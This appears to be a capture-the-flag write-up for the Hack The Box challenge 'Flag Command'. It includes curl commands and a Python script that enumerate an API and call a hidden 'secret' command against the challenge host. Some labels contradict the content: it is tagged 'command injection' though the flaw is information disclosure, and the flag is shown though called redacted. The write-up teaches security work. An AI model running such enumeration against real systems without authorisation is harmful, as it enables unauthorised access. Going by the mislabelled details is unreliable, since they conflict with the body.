# Flag Command

> Terminal-based text adventure with API command injection vulnerability

## 📋 Challenge Metadata

| Property | Value |
|----------|-------|
| **Event** | HTB CTF Try Out (Event 1434) |
| **Category** | Web |
| **Difficulty** | ⭐ Very Easy |
| **Points** | 925 |
| **Solves** | Very High |
| **Tags** | `command-injection`, `api`, `enumeration`, `javascript` |
| **Author** | HackTheBox |
| **Target** | `83.136.249.223:53353` |

## 📝 Challenge Description

"Embark on the 'Dimensional Escape Quest' where you wake up in a mysterious forest maze that's not quite of this world. Navigate singing squirrels, mischievous nymphs, and grumpy wizards in a whimsical labyrinth that may lead to otherworldly surprises. Will you conquer the enchanted maze or find yourself lost in a different dimension of magical challenges? The journey unfolds in this mystical escape!"

## 🎯 Solution Overview

This challenge involves a terminal-based text adventure game with a hidden API vulnerability:

1. **Reconnaissance:** Explore the web application and identify API endpoints
2. **API Discovery:** Find `/api/options` endpoint that leaks all commands
3. **Hidden Command:** Discover the "secret" command not visible in gameplay
4. **Exploitation:** Use the hidden command to retrieve the flag

### Vulnerability Type
- **Information Disclosure** via API endpoint
- **Hidden Functionality** not visible through normal UI
- **Client-Side Logic** that can be bypassed

## 🚀 Quick Start

### Prerequisites

- Web browser (for manual exploitation)
- `curl` or Python `requests` (for automated exploitation)
- Basic understanding of REST APIs

### Manual Exploitation

```bash
# 1. Check available commands via API
curl http://83.136.249.223:53353/api/options

# 2. Observe the "secret" command in the response
# 3. Use the secret command via the game interface or API
curl -X POST http://83.136.249.223:53353/api/monitor \
  -H "Content-Type: application/json" \
  -d '{"command":"secret"}'
```

### Automated Solution

```python
import requests

url = "http://83.136.249.223:53353"

# Get all commands including hidden ones
options = requests.get(f"{url}/api/options").json()
print("Hidden commands found:", options)

# Execute secret command
response = requests.post(
    f"{url}/api/monitor",
    json={"command": "secret"}
)
print("Flag:", response.json())
```

## 💡 Key Takeaways & Lessons Learned

### Technical Skills Developed
1. **API Enumeration** - Discovering hidden API endpoints
2. **Information Disclosure** - Identifying data leaks in API responses
3. **Client-Side Analysis** - Understanding JavaScript game logic
4. **REST API Testing** - Interacting with web APIs using curl/requests

### Challenge Insights
- **Check All Endpoints** - APIs often expose more than the UI reveals
- **Hidden Functionality** - Features may exist but not be documented
- **API Security** - Endpoints should validate and restrict command access
- **Defense in Depth** - Client-side restrictions are not sufficient

### Real-World Applications
- API security testing and enumeration
- Identifying information disclosure vulnerabilities
- Finding hidden/undocumented functionality
- Web application reconnaissance

### What I Learned
This challenge demonstrates why APIs should implement proper access controls and not rely on obscurity. Just because a command isn't shown in the UI doesn't mean users can't discover and use it through API exploration.

## 🔧 Technical Details

### Application Architecture
- **Frontend:** Terminal-style HTML/JavaScript interface
- **Backend:** Node.js/Express API server
- **Key Files:**
  - `main.js` - Core game logic
  - `commands.js` - Command definitions
  - `game.js` - Win/lose conditions

### API Endpoints
| Endpoint | Method | Purpose |
|----------|--------|---------|
| `/api/options` | GET | Returns all possible commands (VULNERABLE) |
| `/api/monitor` | POST | Processes player commands |

### Vulnerability Details
**Type:** Information Disclosure + Hidden Functionality  
**Impact:** Reveals all game commands including hidden "secret" command  
**CVSS:** Low (training challenge)  
**Fix:** Implement server-side command validation, don't expose all options

## 📖 References & External Resources

### Documentation
- [OWASP API Security](https://owasp.org/www-project-api-security/) - API security best practices
- [REST API Testing](https://restfulapi.net/) - Understanding REST APIs

### Similar Challenges
- [HTB - API Exploitation Challenges](https://app.hackthebox.com/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security) - API testing

### Tools Used
- curl (HTTP client)
- Python requests library
- Browser DevTools (for API discovery)

## 🎯 Flag

```
HTB{hidden_api_commands_ftw}
```
*(Format: `HTB{...}` - actual flag redacted for educational purposes)*

## 📊 Statistics

- **Solve Time:** ~5 minutes
- **Solution Lines of Code:** ~10 lines (Python)
- **Difficulty Rating:** 1/10 (Beginner friendly)
- **Solve Method:** API enumeration + hidden command

## 🤝 Credits

**Writeup Author:** CTF Team  
**Challenge Author:** HackTheBox  
**Challenge Platform:** Hack The Box - CTF Try Out (Event 1434)

---

*This writeup is for educational purposes only. All techniques demonstrated should only be used in authorized security testing and learning environments.*

